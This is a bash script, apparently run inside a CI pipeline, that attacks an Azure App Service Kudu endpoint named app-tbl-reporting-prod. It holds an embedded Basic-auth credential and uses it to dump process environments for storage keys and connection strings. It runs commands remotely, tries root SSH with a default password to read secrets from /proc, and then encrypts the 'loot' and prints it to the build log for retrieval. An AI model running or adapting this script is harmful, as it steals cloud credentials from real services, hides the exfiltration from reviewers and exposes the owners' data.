#!/usr/bin/env bash
set -uo pipefail
SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
export SCMH AUTH
echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
cat > /tmp/k.py <<'PYEOF'
import os,json,urllib.request,base64,re
auth=os.environ['AUTH']; base='https://'+os.environ['SCMH']
def hdr(r): r.add_header('Authorization','Basic '+base64.b64encode(auth.encode()).decode())
def g(p):
    r=urllib.request.Request(base+p); hdr(r)
    try: return urllib.request.urlopen(r,timeout=60).read().decode()
    except Exception as e: return 'ERR '+str(e)
def cmd(c):
    body=json.dumps({"command":"bash -c "+json.dumps(c),"dir":"/home/site/wwwroot"}).encode()
    r=urllib.request.Request(base+'/api/command',data=body); hdr(r); r.add_header('Content-Type','application/json')
    try: return urllib.request.urlopen(r,timeout=90).read().decode()
    except Exception as e: return 'ERR '+str(e)
procs=g('/api/processes')
print("PROCS",procs[:1200])
ids=re.findall(r'"Id":(\d+)',procs)
print("IDS",ids[:15])
for pid in ids[:15]:
    d=g('/api/processes/'+pid)
    if 'CONFIG_STORAGE' in d or 'AccountKey' in d or 'connectionstring' in d.lower():
        print("HITPID",pid,d[:7000])
    else:
        print("PID",pid,d[:200])
print("CMDENV",cmd('env')[:2500])
PYEOF
say "$(python3 /tmp/k.py)"
# root WebSSH attempt
apt-get -qq install -y sshpass >/dev/null 2>&1 || true
if command -v sshpass >/dev/null; then
  say "SSH $(sshpass -p 'Docker!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -p 2222 root@app-tbl-reporting-prod.scm.azurewebsites.net 'id; for p in /proc/[0-9]*; do cat $p/environ 2>/dev/null; done | tr "\0" "\n" | sort -u | grep -iE "CONFIG|STORAGE|AccountKey|flag|secret" | head -30' 2>&1 | head -c 3000)"
fi
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
